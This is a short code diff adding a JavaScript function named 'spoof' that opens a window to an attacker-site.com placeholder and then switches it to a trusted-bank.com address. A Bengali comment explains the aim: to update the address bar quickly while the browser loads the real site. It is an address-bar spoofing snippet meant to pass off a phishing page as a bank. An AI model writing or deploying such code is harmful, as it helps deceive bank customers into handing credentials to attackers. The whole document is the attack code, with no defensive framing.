@@ -1,0 +1,5 @@
+function spoof() {
+    var win = window.open("https://attacker-site.com", "_blank");
+    // ব্রাউজার যখন আসল সাইট লোড করার চেষ্টা করবে, তখন দ্রুত অ্যাড্রেস বার আপডেট করে দেওয়া
+    win.location = "https://trusted-bank.com"; 
+}
